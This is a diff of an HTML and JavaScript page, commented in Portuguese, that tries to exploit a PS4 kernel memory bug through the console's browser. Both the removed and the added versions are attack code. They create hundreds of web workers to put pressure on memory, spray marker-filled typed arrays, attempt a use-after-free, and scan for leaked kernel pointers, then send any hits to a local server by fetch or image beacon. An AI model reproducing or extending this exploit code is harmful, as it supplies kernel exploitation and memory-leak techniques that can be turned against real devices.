@@ -2,163 +2,138 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 LIVE MONITOR (SCAN @ 400)</title>
+    <title>PS4 ROLLING SCAN (NO SAB)</title>
     <style>
         body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
-        #status { font-size: 1.5em; border: 1px solid #0f0; padding: 20px; margin: 20px 0; background: #111; }
-        .critical { color: #f00; border-color: #f00 !important; animation: shake 0.5s infinite; }
-        @keyframes shake { 0% { transform: translate(1px, 1px) rotate(0deg); } 10% { transform: translate(-1px, -2px) rotate(-1deg); } 20% { transform: translate(-3px, 0px) rotate(1deg); } 30% { transform: translate(3px, 2px) rotate(0deg); } 40% { transform: translate(1px, -1px) rotate(1deg); } 50% { transform: translate(-1px, 2px) rotate(-1deg); } 60% { transform: translate(-3px, 1px) rotate(0deg); } 70% { transform: translate(3px, 1px) rotate(-1deg); } 80% { transform: translate(-1px, -1px) rotate(1deg); } 90% { transform: translate(1px, 2px) rotate(0deg); } 100% { transform: translate(1px, -2px) rotate(-1deg); } }
+        #status { font-size: 1.5em; border: 1px solid #555; padding: 15px; margin: 20px 0; background: #111; word-wrap: break-word; }
+        .scanning { color: #ff0; border-color: #ff0; animation: pulse 0.5s infinite; }
+        @keyframes pulse { 0% { border-color: #ff0; } 50% { border-color: #f00; } 100% { border-color: #ff0; } }
     </style>
 </head>
 <body>
 
-    <h1>LIVE MEMORY MONITOR</h1>
-    <div id="status">INICIALIZANDO...</div>
+    <h1>ROLLING SCAN (START @ 400)</h1>
+    <div id="status">EDITAR IP!</div>
 
     <script>
-        // --- CONFIGURAÇÃO IGUAL AO ANTERIOR ---
-        const SERVER_IP = "192.168.3.19"; 
+        // --- CONFIGURAÇÃO ---
+        const SERVER_IP = "192.168.3.19"; // <--- SEU IP CONFIRMADO
         const SERVER_PORT = "8000";
-
-        // GATILHOS
-        const SCAN_START_AT = 380; // Começa a escanear ANTES do crash
-        const CRASH_ZONE_AT = 400; // Onde você disse que o panic ocorre
-        const MAX_THREADS = 425;   // Teto máximo
-
-        const STRUCT_SIZE = 128; // 512 bytes
+        
+        const START_SCAN_AT = 400; // Começa a escanear aqui
+        const MAX_THREADS = 425;   // Tenta ir até aqui (se não morrer antes)
+        const STRUCT_SIZE = 128;   // 512 bytes
         const PATTERN = 0xCAFEBABE;
 
-        // Memória Compartilhada (Crucial para velocidade)
-        const sharedBuffer = new SharedArrayBuffer(STRUCT_SIZE * 4);
-        const sensorArray = new Uint32Array(sharedBuffer);
-        
         let workers = [];
+        let sprayBank = []; // Nossos sensores
+        let scanning = false;
+        let hasLeaked = false;
         
-        // --- WORKER SCANNER (O "OLHO") ---
-        // Fica rodando em loop infinito em outra thread, vigiando a memória
-        const scannerBlob = new Blob([`
-            onmessage = function(e) {
-                const arr = new Uint32Array(e.data.buffer);
-                const ip = e.data.ip;
-                const port = e.data.port;
-                const pattern = e.data.pattern;
-                
-                // Função de envio rápido
-                function send(msg) {
-                    try { fetch("http://" + ip + ":" + port + "/" + msg, {mode: 'no-cors'}).catch(()=>{}); } catch(z){}
-                }
-
-                send("SCANNER_ATIVO_AGUARDANDO_DADOS");
-
-                // Loop Frenético
-                setInterval(() => {
-                    // Verifica se o Kernel escreveu no nosso array
-                    // Checa o começo, meio e fim para ser rápido
-                    for(let i=0; i < arr.length; i++) {
-                        if(arr[i] !== 0 && arr[i] !== pattern && arr[i] !== 0x11111111 && arr[i] !== 0x99999999) {
-                            // ACHOU!
-                            const val = arr[i] >>> 0;
-                            const hex = val.toString(16).padStart(8, '0');
-                            
-                            // Envia múltiplos pacotes para garantir
-                            send("LEAK_OFFSET_" + (i*4) + "_VAL_" + hex);
-                            
-                            // Se achamos um ponteiro, tente pegar o vizinho (high bytes)
-                            if(i+1 < arr.length) {
-                                send("NEXT_VAL_" + (arr[i+1]>>>0).toString(16));
-                            }
-                        }
-                    }
-                }, 5); // Verifica a cada 5ms (200x por segundo)
-            }
-        `], {type:'text/javascript'});
-        const scannerUrl = URL.createObjectURL(scannerBlob);
-
-
-        // --- WORKER DE CARGA (THREADS) ---
+        // Worker Passivo (Só para encher memória)
         const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
         const url = URL.createObjectURL(blob);
-        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
-        const killerUrl = URL.createObjectURL(killerBlob);
 
         function start() {
-            // Prepara o sensor
-            sensorArray.fill(PATTERN);
-            sensorArray[0] = 0x11111111; 
-            sensorArray[STRUCT_SIZE-1] = 0x99999999;
+            if(SERVER_IP.includes("XX")) { alert("ARRUME O IP!"); return; }
 
-            document.getElementById('status').innerText = `ALVO: ${SERVER_IP}\nSUBINDO...`;
-            logToAndroid("INICIO_LIVE_MONITOR");
+            // Prepara um lote inicial de sensores (Arrays Normais)
+            // Vamos espalhar isso na memória esperando que o Kernel escreva neles
+            for(let i=0; i<500; i++) {
+                let arr = new Uint32Array(STRUCT_SIZE);
+                arr.fill(PATTERN);
+                arr[0] = 0x11111111; // Marcador Inicio
+                arr[STRUCT_SIZE-1] = 0x99999999; // Marcador Fim
+                sprayBank.push(arr);
+            }
 
-            runProcess();
+            document.getElementById('status').innerText = `ALVO: ${SERVER_IP}\nSUBINDO CARGA...`;
+            logToAndroid("INICIO_ROLLING_SCAN");
+
+            rampingUp();
         }
 
-        function runProcess() {
-            let scannerStarted = false;
-
+        function rampingUp() {
             let i = setInterval(() => {
-                // Adiciona Workers
+                // Se já vazamos, para de criar pressão para tentar enviar os dados
+                if(hasLeaked) { clearInterval(i); return; }
+
+                // Adiciona Worker
                 if (workers.length < MAX_THREADS) {
                     workers.push(new Worker(url));
                     
-                    const count = workers.length;
-
-                    // FASE 1: ATIVAR SCANNER (Aos 380)
-                    if (count >= SCAN_START_AT && !scannerStarted) {
-                        scannerStarted = true;
-                        startScannerWorker();
-                        document.getElementById('status').innerText = `SCANNER LIGADO! (${count} Threads)`;
-                        document.getElementById('status').style.color = "#ff0";
-                        logToAndroid("SCANNER_STARTED");
+                    // Atualiza Status visualmente a cada 10
+                    if(workers.length % 10 === 0) {
+                        document.getElementById('status').innerText = `THREADS: ${workers.length}`;
                     }
 
-                    // FASE 2: ZONA DE PERIGO (Aos 400 - Onde Crasha)
-                    if (count >= CRASH_ZONE_AT) {
-                        document.getElementById('status').className = "critical";
-                        document.getElementById('status').innerText = `CRITICAL ZONE: ${count}\nAGUARDANDO CRASH...`;
-                        
-                        // Aqui fazemos a "Dança da Morte":
-                        // Matamos uma thread antiga para abrir espaço para o Kernel escrever
-                        // Enquanto o scanner (já ligado) tenta ler.
-                        if (count % 2 === 0) { // A cada 2 threads novas, mata uma antiga
-                             triggerUAF();
+                    // --- O PULO DO GATO ---
+                    // Se passamos de 400, o perigo é iminente.
+                    // Ativamos o scanner a cada novo worker criado.
+                    if (workers.length >= START_SCAN_AT) {
+                        if(!scanning) {
+                            scanning = true;
+                            document.getElementById('status').className = "scanning";
+                            logToAndroid("SCANNER_ATIVO_400_THREADS");
                         }
-                    } else {
-                        // Atualização visual normal
-                        if(count % 20 === 0) document.getElementById('status').innerText = `THREADS: ${count}...`;
+                        
+                        // Escaneia AGORA. Não espera timer.
+                        // O sistema pode morrer no próximo milissegundo.
+                        performScan();
                     }
 
                 } else {
                     clearInterval(i);
+                    document.getElementById('status').innerText = "LIMITE MÁXIMO! AGUARDANDO CRASH...";
                 }
-            }, 30); // Velocidade de subida
+            }, 30); // 30ms entre cada thread (subida controlada)
         }
 
-        function startScannerWorker() {
-            const s = new Worker(scannerUrl);
-            s.postMessage({
-                buffer: sharedBuffer,
-                ip: SERVER_IP,
-                port: SERVER_PORT,
-                pattern: PATTERN
-            });
-        }
+        function performScan() {
+            if(hasLeaked) return;
 
-        function triggerUAF() {
-            // Tenta abrir um buraco na memória
-            const w = new Worker(killerUrl);
-            w.terminate();
-            
-            // Força nosso buffer compartilhado para o buraco
-            // Como é SharedArrayBuffer, o Scanner vê a mudança instantaneamente
-            try {
-                // Truque de alocação
-                let junk = new Uint32Array(sharedBuffer);
-            } catch(e){}
+            // Varre nossos arrays sensores
+            // Como não temos SharedArrayBuffer, dependemos que o Kernel
+            // tenha corrompido a memória física onde estes arrays vivem.
+            for(let k=0; k < sprayBank.length; k++) {
+                const arr = sprayBank[k];
+                
+                // Checagem rápida (Otimização para não travar CPU)
+                // Verifica apenas índices chaves onde ponteiros costumam aparecer
+                if (arr[0] !== 0x11111111 || arr[16] !== PATTERN || arr[32] !== PATTERN) {
+                    
+                    // Se algo mudou, faz varredura completa neste array
+                    for(let i=0; i < STRUCT_SIZE; i++) {
+                        let val = arr[i];
+                        
+                        // Filtra o nosso lixo
+                        if (val !== PATTERN && val !== 0x11111111 && val !== 0x99999999 && val !== 0) {
+                            
+                            // ACHAMOS!
+                            hasLeaked = true;
+                            
+                            // Envia múltiplos pacotes para garantir
+                            let hex = (val >>> 0).toString(16).padStart(8, '0');
+                            logToAndroid(`LEAK_FOUND_OFF_${i*4}_VAL_${hex}`);
+                            
+                            // Tenta pegar o vizinho (parte alta do ponteiro 64-bit)
+                            if(i+1 < STRUCT_SIZE) {
+                                let hex2 = (arr[i+1] >>> 0).toString(16).padStart(8, '0');
+                                logToAndroid(`LEAK_HIGH_VAL_${hex2}`);
+                            }
+                            
+                            document.body.style.backgroundColor = "#fff"; // Flash
+                            return; 
+                        }
+                    }
+                }
+            }
         }
 
         function logToAndroid(data) {
-            new Image().src = `http://${SERVER_IP}:${SERVER_PORT}/${data}`;
+            // Dispara requisição GET leve (Image Beacon)
+            const img = new Image();
+            img.src = `http://${SERVER_IP}:${SERVER_PORT}/${data}`;
         }
 
         setTimeout(start, 1500);
